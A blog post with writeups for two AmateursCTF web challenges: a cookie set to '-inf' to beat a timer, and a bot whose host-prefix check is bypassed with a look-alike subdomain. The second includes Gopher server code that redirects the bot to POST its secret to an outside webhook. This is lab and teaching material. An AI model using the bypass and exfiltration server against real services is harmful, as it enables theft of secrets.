---
layout: post
title: AmateursCTF Web Writeup
tags: [ctf, ctf writeup, ctf web]
---

[AmateursCTF](https://ctf.amateurs.team/)  
[Event on CTFtime](https://ctftime.org/event/1983)

3 web challenge writeups in this post:
- [wait-an-eternity](#wait-an-eternity)
- [go-gopher](#go-gopher)

## wait-an-eternity

- Description: 
> My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I've been waiting a couple days and it's still asking me to wait. I'm getting a little impatient, could you help me get the flag?
- Author: voxal
- Entry point: [waiting-an-eternity.amt.rs](https://waiting-an-eternity.amt.rs/)

### First eternity

The webpage just had text "just wait an eternity". When inspect the request, there is a "Refresh" header with a huge value and url with a secret code.

![First eternity](/assets/image/amateursctf-web-writeup/first-eternity.png)

### Another eternity

Visit the url in the "Refresh" header, it shows a page saying "welcome. please wait another eternity.".

Inspect the request, it sets a cookie "time" with a value appears to be the current timestamp like `1690326049.1573777`. With the cookie set, refresh the page, and the page shows text like "you have not waited an eternity. you have only waited 228.13574051856995 seconds". The time mentioned in the message appears to be the difference between the current timestamp and the timestamp in the cookie.

Sets the cookie to a large value, it says have only waited a large negative number of seconds. Sets the cookie to a negative value, it says have waited a large number of seconds, but there is still no flag.

The message told to wait an eternity, but how long is an eternity? The internet says the definitions of eternity is "[infinite time](https://www.dictionary.com/browse/eternity)", "[time that never ends](https://dictionary.cambridge.org/dictionary/english/eternity)" or "a very long time". Hmm, how long the website would consider to be an eternity? Look up gunicorn that appears to be the web server according to the response header, the website is running Python. In Python, a number (except `-inf`) minus `-inf` would be `inf`. So, if the cookie value is `-inf`, the number of seconds have waited would be `inf`, and website would consider it to be an eternity.

![Another eternity](/assets/image/amateursctf-web-writeup/another-eternity.png)

After two eternities, I got the flag:

```
amateursCTF{im_g0iNg_2_s13Ep_foR_a_looo0ooO0oOooooOng_t1M3}
```

#### Speculation

The web server is probably taking value from the cookie, and use `float()` to convert it to a float, thus `float('-inf')` would be float `-inf`. Number of seconds waited is calculated by subtracting the float value from the current timestamp. (Actually, yes, can confirm with the [source code](https://github.com/les-amateurs/AmateursCTF-Public/blob/b9b40a55969e3e1553ed14e66bb460a9370db509/2023/web/waiting-an-eternity/main.py#L18))

## go-gopher

This challenge was cheesed with subdomains or certain domain names because it only checks the host prefix. There is a revenge challenge [gopher-revenge](#gopher-revenge).

- Description:
> psst... i know flag sharing isn't allowed, and i found this page where someone seems to be recieving flags from someone else. can you somehow find a way to hijack this site so it gives me flags? thanks.
- Author: voxal
- Entry point:
  - gopher://amt.rs:31290/
  - [gopher-bot.amt.rs](https://gopher-bot.amt.rs/)
- Downloads:
  - [bot.go](https://amateurs-prod.storage.googleapis.com/uploads/7c93488d980366dd6255b08e1bb8ac751565508920151011276c964116df5479/bot.go)
  - [main.go](https://amateurs-prod.storage.googleapis.com/uploads/b652421619610ac09116d516ac4f659ac95d73402048c96e29cfb2ad183104f7/main.go)

### The challenge

Submit and Visit function for bot

```go
func Submit(w http.ResponseWriter, r *http.Request) {
	r.ParseForm()
	u, err := url.Parse(r.Form.Get("url"))
	if err != nil || !strings.HasPrefix(u.Host, "amt.rs") {
		w.Write([]byte("Invalid url"))
		return
	}
	w.Write([]byte(Visit(r.Form.Get("url"))))
}
func Visit(url string) string {
	fmt.Println(url)
	res, err := gopher.Get(url)
	if err != nil {
		return fmt.Sprintf("Something went wrong: %s", err.Error())
	}
	h, _ := res.Dir.ToText()
	fmt.Println(string(h))
	url, _ = strings.CutPrefix(res.Dir.Items[2].Selector, "URL:")
	fmt.Println(url)
	_, err = http.Post(url, "text/plain", bytes.NewBuffer(flag))
	if err != nil {
		return "Failed to make request"
	}
	return "Successful visit"
}
```

The bot will make Gopher request to the url provided, extract the URL from the selector of the 3rd item (at index 2) in the response, and make a POST request to the URL with the flag.

The bot does restrict the host of the Gopher url to start with `amt.rs`, however this can be easily bypassed with subdomains like `gopher://amt.rs.cjxol.com:31290/`. The the server can response with my URL in the relative position, the bot would make a POST request to my URL with the flag. The URL for the POST request is not restricted.

![go-gopher flag](/assets/image/amateursctf-web-writeup/go-gopher-flag.png)

Here is my Gopher server code:
```go
package main
import (
        "fmt"
        "log"
        "git.mills.io/prologic/go-gopher"
)
func hello(w gopher.ResponseWriter, r *gopher.Request) {
        w.WriteInfo("Hello!")
        w.WriteInfo("again")
        w.WriteItem(&gopher.Item{
                Selector:       "https://webhook.site/[reducted]",
        })
        fmt.Println("hello")
}
func main() {
        gopher.HandleFunc("/", hello)
        log.Fatal(gopher.ListenAndServe("0.0.0.0:31337", nil))
}
```

Here is the Gopher response:
```
iHello!         error.host      1
iagain          error.host      1
        https://webhook.site/[reducted]       ::      31337
.
```

## gopher-revenge

- Description:
  > you guys are going to regret ever crossing me.

  Later added the following clarification/hint due to a few teams with very close solutions fails submitting the correct flag:
  > the flag in "flag.txt" is the exact same flag you need to submit
- Author: voxal

TODO: writeup
